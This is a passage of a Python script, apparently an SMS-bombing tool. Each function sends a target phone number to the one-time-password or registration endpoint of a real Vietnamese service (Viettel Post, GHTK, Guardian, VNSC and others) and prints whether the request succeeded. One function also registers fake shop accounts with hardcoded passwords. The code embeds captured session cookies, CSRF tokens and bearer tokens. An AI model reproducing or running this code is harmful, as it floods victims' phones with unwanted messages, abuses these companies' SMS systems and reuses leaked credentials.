        'referer': 'https://www.liena.com.vn/?gad_source=1&gclid=CjwKCAjw9eO3BhBNEiwAoc0-jTqAbel8_7VQKkVBrv--8QcKLRdxat-thOoWRBU8OQYaV6eYP3LvqhoC7vQQAvD_BwE',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Opera";v="113", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 OPR/113.0.0.0',
    }

    json_data = {
        'phone_number': sdt,
    }

    try:
        response = requests.post(
            'https://www.liena.com.vn/rest/V1/liena/customer/login/request-otp',
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("LIENA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("LIENA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vietloan():
    cookies = {
        '__cfruid': '05c03e929b8d153fadff28cedc1c83496de196dc-1733298509',
        '_cfuvid': '9GBYyFdo7pwXAmByPkQU_GZLFGZmyGMcs9T_UsZegrM-1735362193577-0.0.1.1-604800000',
        'XSRF-TOKEN': 'eyJpdiI6InQ2VTI5eHJkNTVRUi9tQmtTQWVwV1E9PSIsInZhbHVlIjoib25uakNYUUozWWx5NWZ6SUJZaFFERmFGN0NrUDRuZ0k3L1lvek16UzI1SEQwdUhuZ0xrWTA5QlpKZGJFSDBXdW1IeWVFcjJWRUVsOGo3NVF5eERwWTY4eHlhODVOL2ZyUGhPZ0c4M3NRL1A5OVh2R3FRM3U0TVhESG9WTStlZy8iLCJtYWMiOiI5ZjM4MWVjZGI3YjM5OGQxNmVhNjIxMTQxZmE3NTY5ZjgwY2E0YzgxMzZlOTM4YjdiZTQzYzY0OGFhZjkyOGRhIiwidGFnIjoiIn0%3D',
        'sessionid': 'eyJpdiI6InlzQVl4RVpXdUdDQW1TMjJnZ0tBU2c9PSIsInZhbHVlIjoiS290QnJsZDBaMDYrdUNQYmQ2MmdjYStScXFyL0hZVTNVcWJvSmxJbXZPZUZ1djNaMnNhZS9WcTViYmxjVFo5aXNJTFEvUEVxU1VvK0QrQm9ZUk1OM1NjV1VlSWUxUnBlOFZKb3FqZEt2N0FBaGlzTXRIT0Eza2pVL21ZcDhLb3UiLCJtYWMiOiIwMGI2ODNmNzFjNWVlMzMwMTc4ODZjNzQxYTJmYzNmOGRlNjRkMWRjNDhiZmQ3YTk5ZDBjMjRhM2RhNmIxZTQyIiwidGFnIjoiIn0%3D',
        'utm_uid': 'eyJpdiI6IjFLOXVTd2t3UFVFK0lPWldwNmpzcHc9PSIsInZhbHVlIjoiLzgvQmgzRTNIaEU2Tk9pSmM1SVRqa2ZMeTZGd2Vhei9LcUhLUGdtczZBZzJMT2RXMHh5ZThmMWJtNmtacXp2MTlJOFZZVUZQZERLSEdoL3Q5TzdOUFpITjBxVXpGNUFSMkg0ZHRweng4RFRzSm5tOEJJTVVpZVdxNHhWSWx1MDkiLCJtYWMiOiJjOTdjOWZiZTQyOTEwMjgyMTMwZWVmZjljZjRkYmU4MzE3OGRiMmJjODBhMTdjZGU3NGFmNGQxZGRlYTllMDU0IiwidGFnIjoiIn0%3D',
        'ec_cache_utm': '632e6101-b428-93c3-3898-ca177175bb79',
        'ec_cache_client': 'false',
        'ec_cache_client_utm': 'null',
        'ec_png_client': 'false',
        'ec_png_client_utm': 'null',
        'ec_png_utm': '632e6101-b428-93c3-3898-ca177175bb79',
        'ec_etag_utm': '632e6101-b428-93c3-3898-ca177175bb79',
        'ec_etag_client': 'false',
        'ec_etag_client_utm': 'null',
        'uid': '632e6101-b428-93c3-3898-ca177175bb79',
        'client': 'false',
        'client_utm': 'null',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '__cfruid=05c03e929b8d153fadff28cedc1c83496de196dc-1733298509; _cfuvid=9GBYyFdo7pwXAmByPkQU_GZLFGZmyGMcs9T_UsZegrM-1735362193577-0.0.1.1-604800000; XSRF-TOKEN=eyJpdiI6InQ2VTI5eHJkNTVRUi9tQmtTQWVwV1E9PSIsInZhbHVlIjoib25uakNYUUozWWx5NWZ6SUJZaFFERmFGN0NrUDRuZ0k3L1lvek16UzI1SEQwdUhuZ0xrWTA5QlpKZGJFSDBXdW1IeWVFcjJWRUVsOGo3NVF5eERwWTY4eHlhODVOL2ZyUGhPZ0c4M3NRL1A5OVh2R3FRM3U0TVhESG9WTStlZy8iLCJtYWMiOiI5ZjM4MWVjZGI3YjM5OGQxNmVhNjIxMTQxZmE3NTY5ZjgwY2E0YzgxMzZlOTM4YjdiZTQzYzY0OGFhZjkyOGRhIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6InlzQVl4RVpXdUdDQW1TMjJnZ0tBU2c9PSIsInZhbHVlIjoiS290QnJsZDBaMDYrdUNQYmQ2MmdjYStScXFyL0hZVTNVcWJvSmxJbXZPZUZ1djNaMnNhZS9WcTViYmxjVFo5aXNJTFEvUEVxU1VvK0QrQm9ZUk1OM1NjV1VlSWUxUnBlOFZKb3FqZEt2N0FBaGlzTXRIT0Eza2pVL21ZcDhLb3UiLCJtYWMiOiIwMGI2ODNmNzFjNWVlMzMwMTc4ODZjNzQxYTJmYzNmOGRlNjRkMWRjNDhiZmQ3YTk5ZDBjMjRhM2RhNmIxZTQyIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IjFLOXVTd2t3UFVFK0lPWldwNmpzcHc9PSIsInZhbHVlIjoiLzgvQmgzRTNIaEU2Tk9pSmM1SVRqa2ZMeTZGd2Vhei9LcUhLUGdtczZBZzJMT2RXMHh5ZThmMWJtNmtacXp2MTlJOFZZVUZQZERLSEdoL3Q5TzdOUFpITjBxVXpGNUFSMkg0ZHRweng4RFRzSm5tOEJJTVVpZVdxNHhWSWx1MDkiLCJtYWMiOiJjOTdjOWZiZTQyOTEwMjgyMTMwZWVmZjljZjRkYmU4MzE3OGRiMmJjODBhMTdjZGU3NGFmNGQxZGRlYTllMDU0IiwidGFnIjoiIn0%3D; ec_cache_utm=632e6101-b428-93c3-3898-ca177175bb79; ec_cache_client=false; ec_cache_client_utm=null; ec_png_client=false; ec_png_client_utm=null; ec_png_utm=632e6101-b428-93c3-3898-ca177175bb79; ec_etag_utm=632e6101-b428-93c3-3898-ca177175bb79; ec_etag_client=false; ec_etag_client_utm=null; uid=632e6101-b428-93c3-3898-ca177175bb79; client=false; client_utm=null',
        'origin': 'https://vietloan.vn',
        'priority': 'u=1, i',
        'referer': 'https://vietloan.vn/register',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
        '_token': 'gon4gpLLlt0bWW9MXCpcKzWpULwdpj9p09rqcUVf',
    }

    try:
        response = requests.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VIETLOAN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VIETLOAN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def viettelpost():
    cookies = {
        'QUIZIZZ_WS_COOKIE': 'id_192.168.12.141_15001',
        '.AspNetCore.Antiforgery.XvyenbqPRmk': 'CfDJ8ASZJlA33dJMoWx8wnezdv-ldmCeCauiRwoNjbMuIi_12RwO7MX0bWiH1o0iU8D3b4WYfRUPQnjqeIiIpn3XmYRFi_KAJ99Y0oUQzmpZyla6brgkixhji6p2GHBun7BmyV5E_Ktge00TOT2nKbyulVM',
        '_gid': 'GA1.2.766667119.1722475009',
        '_ga_P86KBF64TN': 'GS1.1.1722475009.1.1.1722475193.0.0.0',
        '_ga_7RZCEBC0S6': 'GS1.1.1722475008.1.1.1722475193.0.0.0',
        '_ga': 'GA1.1.283730043.1722475009',
        '_ga_WN26X24M50': 'GS1.1.1722475008.1.1.1722475193.0.0.0',
    }

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        # 'Cookie': 'QUIZIZZ_WS_COOKIE=id_192.168.12.141_15001; .AspNetCore.Antiforgery.XvyenbqPRmk=CfDJ8ASZJlA33dJMoWx8wnezdv-ldmCeCauiRwoNjbMuIi_12RwO7MX0bWiH1o0iU8D3b4WYfRUPQnjqeIiIpn3XmYRFi_KAJ99Y0oUQzmpZyla6brgkixhji6p2GHBun7BmyV5E_Ktge00TOT2nKbyulVM; _gid=GA1.2.766667119.1722475009; _ga_P86KBF64TN=GS1.1.1722475009.1.1.1722475193.0.0.0; _ga_7RZCEBC0S6=GS1.1.1722475008.1.1.1722475193.0.0.0; _ga=GA1.1.283730043.1722475009; _ga_WN26X24M50=GS1.1.1722475008.1.1.1722475193.0.0.0',
        'Origin': 'null',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'FormVerifyOtpModel.Phone': '',
        'FormVerifyOtpModel.Email': '',
        'FormVerifyOtpModel.Password': '',
        'FormVerifyOtpModel.UserId': '',
        'FormForgotPassword.Email': '',
        'FormForgotPassword.UserId': '',
        'FormForgotPassword.OtpRequestToken': 'hQJjQ5MHm/+Xhhl4WE/bgqiz4zCSvnT05qKj6TdLzs8KoYZsamRBy8gm8QhpxICqva9jHMo6V25AHvcBwxd1XKKwAEtKLyQEf4MzKeDh0xcoyQ1uuOGDCU3BIZUVmpbS2xVvglOZJs4srUSPHb+JLY+l+plhFg3xKvRJBLWpX0SSiip2/oxddKFM4tXwC0QGY8JYhI6UUF/8lwVKqM12H+cd4/DB3SEwaXkix8HEy+RpAnPCNw7N1ZjmTGxwP6cHz8lr6sEIg+mMXiOB/neVMK8xib3SiJf5p7RyzPf7J+CYANyeiU9YGQ0TZJFfSRHm9IEyW6PmxB4+4nh9h5CGU6/7EAw4924l',
        'FormRegister.FullName': 'quoc tien huy',
        'FormRegister.UserName': '',
        'FormRegister.Email': '',
        'FormRegister.Phone': sdt,
        'FormRegister.ConfirmPhone': 'False',
        'FormRegister.ConfirmEmail': 'False',
        'FormRegister.RequiredPhone': 'False',
        'FormRegister.RequiredEmail': 'False',
        'FormRegister.Provider': '',
        'FormRegister.ProviderUserId': '',
        'FormRegister.Password': '123123aA',
        'FormRegister.ConfirmPassword': '123123aA',
        'FormRegister.IsRegisterFromPhone': 'True',
        'FormRegister.UserId': '',
        'FormMergeModel.JsonListEmailConflict': '',
        'FormMergeModel.JsonListPhoneConflict': '',
        'FormMergeModel.EmailSelected': '',
        'FormMergeModel.PhoneSelected': '',
        'FormMergeModel.PhoneVerify': '',
        'FormMergeModel.EmailVerify': '',
        'FormMergeModel.IsRequiredSelect': 'False',
        'FormMergeModel.Password': '',
        'FormMergeModel.Provider': '',
        'FormMergeModel.ProviderUserId': '',
        'FormMergeModel.IsEmailVerified': 'False',
        'FormMergeModel.IsPhoneVerified': 'False',
        'FormNotMergeModel.Password': '',
        'FormNotMergeModel.Provider': '',
        'FormNotMergeModel.ProviderUserId': '',
        'FormNotMergeModel.UserSSOId': '',
        'FormNotMergeModel.EmailSelected': '',
        'FormNotMergeModel.PhoneSelected': '',
        'FormNotMergeModel.NotMergePhoneVerify': '',
        'FormNotMergeModel.NotMergeEmailVerify': '',
        'FormNotMergeModel.IsEmailVerified': 'False',
        'FormNotMergeModel.IsPhoneVerified': 'False',
        'FormLoginOTP.Username': '',
        'ReturnUrl': '/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=2fm315xzemzryzwbsz8jfj',
        'ConfirmOtpType': 'Register',
        'UserClientId': '',
        'ClientId': '',
        'OTPCode1': '',
        'OTPCode2': '',
        'OTPCode3': '',
        'OTPCode4': '',
        'OTPCode5': '',
        'OTPCode6': '',
        '__RequestVerificationToken': 'CfDJ8ASZJlA33dJMoWx8wnezdv-9JDAZiojDWGeKRvEUJqdyE128lDNBqZyxK9-1bDuTNAgW17qbK9uBU6V-VwQFZywRBM06-A6m7VU2ACjP9_OVf1RWEqp2aTwboyIFSzmLAXCbIuwwASKM6jHPCb2IAJ0',
    }

    try:
        response = requests.post('https://id.viettelpost.vn/Account/SendOTPByPhone', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VIETTELPOST | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VIETTELPOST | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def ghtk():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'apptype': 'Web',
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MzM1MDIzNSwidGVsIjoiMDM1NzE1NjMyMiIsImVtYWlsIjoiNjZiMzNmYTRmMjNjNEBnaHRrLmlvIiwiYWNjZXNzX3Rva2VuIjpudWxsLCJqd3QiOm51bGwsImludmFsaWRfYXQiOnsiZGF0ZSI6IjIwMjQtMDgtMTQgMTY6MzQ6MjguOTk1NjkwIiwidGltZXpvbmVfdHlwZSI6MywidGltZXpvbmUiOiJBc2lhXC9Ib19DaGlfTWluaCJ9fQ.nr08Xjl1uhmrMZAaDu3BBO5PPhyBnroiTD9SOrw1hgc',
        'content-type': 'application/json',
        'origin': 'https://khachhang.giaohangtietkiem.vn',
        'priority': 'u=1, i',
        'referer': 'https://khachhang.giaohangtietkiem.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'shop-code': '',
        'uniqdevice': '0b59bf2e-65f0-489a-9ecd-9619d146001f',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'name': 'GTC Shop',
        'tel': sdt,
        'password': '123123aA@',
        'confirm_password': '123123aA@',
        'first_address': '12 BC TIn',
        'province': 'An Giang',
        'province_id': '833',
        'district': 'Huyện Châu Phú',
        'district_id': '1470',
        'ward': 'Xã Bình Long',
        'ward_id': '16579',
        'hamlet': 'Ấp Bình Chiến',
        'hamlet_id': '114065',
    }

    response = requests.post(
        'https://web.giaohangtietkiem.vn/api/v1/register-shop/create-register-shop',
        headers=headers,
        json=json_data,
    )

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'apptype': 'Web',
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MzM1MDIzNywidGVsIjoiMDM1NzE1NjMyMSIsImVtYWlsIjoiNjZiMzNmYzVjOGI2MkBnaHRrLmlvIiwiYWNjZXNzX3Rva2VuIjpudWxsLCJqd3QiOm51bGwsImludmFsaWRfYXQiOnsiZGF0ZSI6IjIwMjQtMDgtMTQgMTY6MzU6MDEuODI2MDUwIiwidGltZXpvbmVfdHlwZSI6MywidGltZXpvbmUiOiJBc2lhXC9Ib19DaGlfTWluaCJ9fQ.th7fjWe_Z1_Aag1RQlDwQ_Q82k1cUkVrghVeJWIHqGI',
        'content-type': 'application/json',
        'origin': 'https://khachhang.giaohangtietkiem.vn',
        'priority': 'u=1, i',
        'referer': 'https://khachhang.giaohangtietkiem.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'shop-code': '',
        'uniqdevice': '0b59bf2e-65f0-489a-9ecd-9619d146001f',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'username': sdt,
        'card_images': [
            {
                'url': 'https://cache.giaohangtietkiem.vn/d/e569e3e6683d23d7de857156622c3703.png',
                'image_order': 1,
            },
            {
                'url': 'https://cache.giaohangtietkiem.vn/d/e8bd8e58171021dcb1bcac57487acf2e.png',
                'image_order': 2,
            },
        ],
    }

    try:
        response = requests.post('https://web.giaohangtietkiem.vn/api/v1/shop/password/send-otp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GHTK | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GHTK | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vuihoc():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'ja',
        'app-id': '3',
        'authorization': 'Bearer',
        'content-type': 'application/json',
        'origin': 'https://vuihoc.vn',
        'priority': 'u=1, i',
        'referer': 'https://vuihoc.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'send-from': 'WEB',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'mobile': sdt,
    }

    try:
        response = requests.post('https://api.vuihoc.vn/api/send-otp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VUIHOC | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VUIHOC | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vnsc():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://invest.vnsc.vn',
        'priority': 'u=1, i',
        'referer': 'https://invest.vnsc.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'type': 'PHONE_VERIFICATION_OTP',
        'phone': sdt,
        'email': '',
    }

    try:
        response = requests.post('https://api.vinasecurities.com/auth/v1/otp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VNSC | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VNSC | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)



def bibomart():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://bibomart.com.vn',
        'priority': 'u=1, i',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone': sdt,
        'type': 1,
    }

    try:
        response = requests.post('https://prod.bibomart.net/customer_account/v2/otp/send', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BIBOMART | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BIBOMART | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def guardian():
    cookies = {
        'SRV': '92f1c88d-78ea-46cc-a177-e20fe4d82a02',
        'PHPSESSID': 'f8c4g12cif92nlr8c5bul4hhkt',
        'form_key': 'hCDIFnr6otgBpV5N',
        'private_content_version': 'a21077efbd01778e4e806c261907e039',
        'form_key': 'hCDIFnr6otgBpV5N',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'mage-cache-sessid': 'true',
        'mage-messages': '',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'section_data_ids': '{%22messages%22:1723359937}',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        # 'cookie': 'SRV=92f1c88d-78ea-46cc-a177-e20fe4d82a02; PHPSESSID=f8c4g12cif92nlr8c5bul4hhkt; form_key=hCDIFnr6otgBpV5N; private_content_version=a21077efbd01778e4e806c261907e039; form_key=hCDIFnr6otgBpV5N; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; section_data_ids={%22messages%22:1723359937}',
        'origin': 'https://www.guardian.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.guardian.com.vn/customer/account/create/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    json_data = {
        'telephone': sdt,
    }
    try:
        response = requests.post('https://www.guardian.com.vn/rest/V1/smsOtp/generateOtpForNewAccount',
        cookies=cookies,
        headers=headers,
        json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GUARDIAN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GUARDIAN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def zl188():
    cookies = {
        '_require_login': '12',
        'XSRF-TOKEN': 'eyJpdiI6IkthQThjdmlSRzlzVHpydFJyM1M3bnc9PSIsInZhbHVlIjoibGZFdjNWWjBIXC9UR1RNK0JBWll2NzFlSzljR2hvbnY0VVBYdk81Yzg5TmdOUWw0V1A0OExmdW9saGFYdFZkQVBOSCtXMDk0SjE5ZndUalZRNndrMWxRPT0iLCJtYWMiOiJlNjY2YjMyOWYxOWI4M2JmZTk5YWMxYTAzNzdjMWRhOGY0ODcxNTM2Y2Q4OGI3NGQ2ZTA4MTU0MDcyZTJmNzYxIn0%3D',
        'laravel_session': 'eyJpdiI6IjYrcmI3ZGxYNUZGcGMzY3QwelV2ZkE9PSIsInZhbHVlIjoicWVhdnQxcmliRXRzUHdJZjRLZTJcL1YrTnhTSzFPQnBZTWFmclBKK2Z4bHUxQWNOY1JcL0hNYTBkZ3o0bVRuUk9Yc0QzZmdDRkhVbk1JNkZWOTliQTRrUT09IiwibWFjIjoiZjUzNTRkZTdhZjEyMTkwMmI4YmZhYWIyMGIzOTM0MDJkNmFmN2RhN2I1YWUzMzZkZWIwYWI4ZTkxNTg2N2RlMSJ9',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_require_login=12; XSRF-TOKEN=eyJpdiI6IkthQThjdmlSRzlzVHpydFJyM1M3bnc9PSIsInZhbHVlIjoibGZFdjNWWjBIXC9UR1RNK0JBWll2NzFlSzljR2hvbnY0VVBYdk81Yzg5TmdOUWw0V1A0OExmdW9saGFYdFZkQVBOSCtXMDk0SjE5ZndUalZRNndrMWxRPT0iLCJtYWMiOiJlNjY2YjMyOWYxOWI4M2JmZTk5YWMxYTAzNzdjMWRhOGY0ODcxNTM2Y2Q4OGI3NGQ2ZTA4MTU0MDcyZTJmNzYxIn0%3D; laravel_session=eyJpdiI6IjYrcmI3ZGxYNUZGcGMzY3QwelV2ZkE9PSIsInZhbHVlIjoicWVhdnQxcmliRXRzUHdJZjRLZTJcL1YrTnhTSzFPQnBZTWFmclBKK2Z4bHUxQWNOY1JcL0hNYTBkZ3o0bVRuUk9Yc0QzZmdDRkhVbk1JNkZWOTliQTRrUT09IiwibWFjIjoiZjUzNTRkZTdhZjEyMTkwMmI4YmZhYWIyMGIzOTM0MDJkNmFmN2RhN2I1YWUzMzZkZWIwYWI4ZTkxNTg2N2RlMSJ9',
        'origin': 'https://188.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://188.com.vn/dang-ky?urlreturn=https://188.com.vn',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'x-csrf-token': 'sQA7ygBkn82zsG3Wv1nIiCKoq9cBKbdzXOOzL53s',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
        'otp_type': '1',
    }

    try:
        response = requests.post('https://188.com.vn/get-token-auth-phone', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("188.COM.VN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("188.COM.VN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def goldenspoonszl():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://goldenspoons.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://goldenspoons.com.vn/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
        'type': 1,
        'language': 1,
        'provider': 2,
    }

    try:
        response = requests.post('https://backend2.tgss.vn/2e55ad4eb9ad4631b65efe18710b6feb/otp/send', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GOLDENSPOONSZL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GOLDENSPOONSZL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def goldenspoonszlresend():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://goldenspoons.com.vn',
